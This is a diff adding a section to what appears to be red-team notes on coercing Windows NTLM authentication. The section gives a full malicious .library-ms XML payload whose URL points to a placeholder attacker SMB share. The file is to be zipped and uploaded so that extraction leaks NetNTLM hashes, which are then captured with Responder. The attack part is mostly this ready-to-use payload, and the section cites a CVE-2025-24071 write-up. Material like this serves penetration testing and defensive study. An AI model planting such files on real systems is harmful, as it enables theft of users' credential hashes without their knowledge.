@@ -26,4 +26,26 @@ One of the most well known techniques for forcing this authentication is through
 -   Windows Library Files (.library-ms)
 -   Windows Search Connectors (.searchConnector-ms)
 
-Source: [MDSec](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/)
+
+#### Windows Library Files {#windows-library-files}
+
+Uploading a zip file that gets extracted, where zip contains `malicious.library-ms`:
+
+```shell { linenos=true, linenostart=1 }
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <simpleLocation>
+        <url>\\<attacker IP>\shared</url>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+We harvest the hash with Responder:
+
+{{< figure src="/images/ntlm_harvest.png" >}}
+
+Sources: [MDSec ](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/)[cti.monster](https://cti.monster/blog/2025/03/18/CVE-2025-24071.html)
